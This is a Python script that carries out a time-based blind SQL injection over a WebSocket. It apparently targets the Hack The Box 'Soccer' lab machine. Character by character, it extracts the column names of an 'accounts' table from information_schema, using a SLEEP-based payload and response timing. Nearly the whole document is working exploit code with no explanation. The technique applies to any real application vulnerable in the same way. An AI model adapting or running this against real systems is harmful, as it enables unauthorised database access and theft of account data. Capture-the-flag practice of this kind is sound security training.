import json
import websocket
import time
import string

url = "ws://soc-player.soccer.htb:9091/"
charset = string.ascii_lowercase + string.digits + "_"
max_len = 20
max_column = 10

for cl in range(0, max_column):
    column_name = ""
    print(f"\n=== Extracting Column {cl+1} (LIMIT {cl},1) ===")

    for i in range(1, max_len+1):
        for c in charset:
            payload = f"1 OR IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='soccer_db' AND table_name='accounts' LIMIT {cl},1),{i},1)='{c}', SLEEP(5), 0)# "
            ws = websocket.create_connection(url)
            data = json.dumps({"id": payload})

            start = time.time()
            ws.send(data)
            result = ws.recv()
            elapsed = time.time() - start
            ws.close()

            print(f"[{i}] Trying '{c}'... {elapsed:.2f}s")

            if elapsed > 4.5:
                column_name += c
                print(f"--> Found character {i}: {c}")
                break
        else:
            print("End of Column name.")
            break

    if column_name:
        print(f"✅ Column {cl+1} Name: {column_name}")
    else:
        print(f"❌ No column found at LIMIT {cl}, stopping.")
        break
